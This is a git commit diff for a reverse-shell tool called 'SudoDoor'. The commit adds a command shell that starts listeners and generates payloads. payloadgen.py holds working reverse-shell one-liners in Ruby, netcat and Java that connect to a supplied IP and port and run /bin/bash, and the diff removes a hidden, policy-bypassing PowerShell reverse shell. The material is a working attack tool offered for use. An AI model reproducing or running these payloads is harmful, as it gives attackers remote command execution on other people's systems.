9d0ecfd690ff89b44825a30e4d9076f513b57739
FireFly7386 <123244840+FireFly7386@users.noreply.github.com>
2023-01-22 17:52:06 +0100

    Added payload command

--- SudoDoor.py
+++ SudoDoor.py
@@ -1,5 +1,5 @@
 import listener
-#import payloadgen
+import payloadgen
 from colors import Colors
 
 
@@ -7,5 +7,33 @@ running = True
 
 while running:
     cmd = input(Colors.RESET + "(" + Colors.RED + "SudoDoor" + Colors.RESET + ") ")
-    if cmd == "listen":
-        listener.listen("0.0.0.0", 9001)
+
+    if cmd == "help":
+        print("""
+List of commands:
+listen <port> --- starts a listener on given port
+payload <ip> <port> <language> --- generate payload
+payload show --- show payloads
+""")
+
+    elif cmd.startswith("listen"):
+        portNum = None
+        port = cmd[7:]
+        try:
+            portNum = int(port)
+        except:
+            print("Usage: listen <port>")
+            continue
+
+        listener.listen("0.0.0.0", portNum)
+
+    elif cmd.startswith("payload"):
+        try:
+            args = cmd.split(" ")
+            if args[1] == "show":
+                payloadgen.showPayloads()
+            else:
+                print(payloadgen.generate_payload(args[1], args[2], args[3]))
+        except:
+            print("Usage: payload <ip> <port> <language> or payload show")
+            continue
--- payloadgen.py
+++ payloadgen.py
@@ -8,7 +8,6 @@ payloads = {
     "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'",
     "nc": "nc -e /bin/bash {} {}",
     "java": "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()",
-    "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{}\",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
 }
 
 def generate_payload(lhost, lport, language):
@@ -18,3 +17,6 @@ def generate_payload(lhost, lport, language):
         return None 
     else:
         return payloads[language].format(lhost, lport)
+    
+def showPayloads():
+    print("Available options are: {}".format(", ".join(payloads.keys())))
